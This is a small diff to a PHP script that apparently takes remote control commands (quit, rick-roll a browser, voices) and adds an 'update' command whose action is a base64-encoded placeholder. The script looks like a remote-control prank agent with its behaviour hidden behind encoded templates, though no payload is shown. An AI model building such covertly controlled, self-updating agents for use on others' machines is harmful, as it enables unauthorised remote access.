@@ -3,6 +3,7 @@
 define('REGEX_VALID_IP_ADDRESS', '{{B64_CONST_REGEX_VALID_IP_ADDRESS}}');
 define('REGEX_SIMPLE_STRING', '{{B64_CONST_REGEX_SIMPLE_STRING}}');
 define('REGEX_CTL_QUIT', '{{B64_CONST_REGEX_CTL_QUIT}}');
+define('REGEX_CTL_UPDATE', '{{B64_CONST_REGEX_CTL_UPDATE}}');
 define('REGEX_CTL_RICK_ROLL', '{{B64_CONST_REGEX_CTL_RICK_ROLL}}');
 define('REGEX_CTL_VOICES', '{{B64_CONST_REGEX_CTL_VOICES}}');
 define('REGEX_CTL_GET_VOICE', '{{B64_CONST_REGEX_CTL_GET_VOICE}}');
@@ -89,6 +90,8 @@ do {
 
         if (preg_match(REGEX_CTL_QUIT, $buf)) {
             break;
+        } else if (preg_match(REGEX_CTL_UPDATE, $buf)) {
+            $msg = '{{B64_CMD_UPDATE}}';
         } else if (preg_match(REGEX_CTL_RICK_ROLL, $buf)) {
             set_volume(7);
             open_url('{{B64_STR_RICK_ROLL_URL}}');
